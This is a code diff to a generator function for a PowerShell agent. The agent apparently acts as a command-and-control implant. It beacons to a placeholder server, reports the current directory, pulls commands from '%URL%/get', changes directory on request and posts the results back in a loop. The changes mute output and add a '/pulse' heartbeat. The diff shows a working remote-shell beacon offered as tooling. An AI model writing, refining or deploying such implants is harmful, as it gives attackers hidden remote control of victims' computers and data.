@@ -7,11 +7,11 @@ def generate(url, frequency):
     $post = ''
     $pwd = Get-Location
 
-    Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8'
+    Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8' | Out-Null
 
     while ($true)
     {
-        Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8'
+        Invoke-RestMethod -Uri %URL%/pulse -Method GET | Out-Null
         Start-Sleep -Seconds $frequency
         $cmd = Invoke-WebRequest -Method POST '%URL%/get'
         if ($cmd.Content -eq 'exit-agent') { break }
@@ -22,7 +22,7 @@ def generate(url, frequency):
         { 
             Set-Location $cmd.Content.replace("cd ", "")
             $pwd = Get-Location
-            Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8'
+            Invoke-RestMethod -Uri %URL%/pwd -Method POST -Body $pwd -ContentType 'text/plain; charset=utf-8' | Out-Null
             $post = 'True'
         }
 
@@ -37,7 +37,7 @@ def generate(url, frequency):
             }
         }
 
-        Invoke-RestMethod -Uri %URL%/post -Method POST -Body $post -ContentType 'text/plain; charset=utf-8'
+        Invoke-RestMethod -Uri %URL%/post -Method POST -Body $post -ContentType 'text/plain; charset=utf-8' | Out-Null
         $post = ''
     }
     """
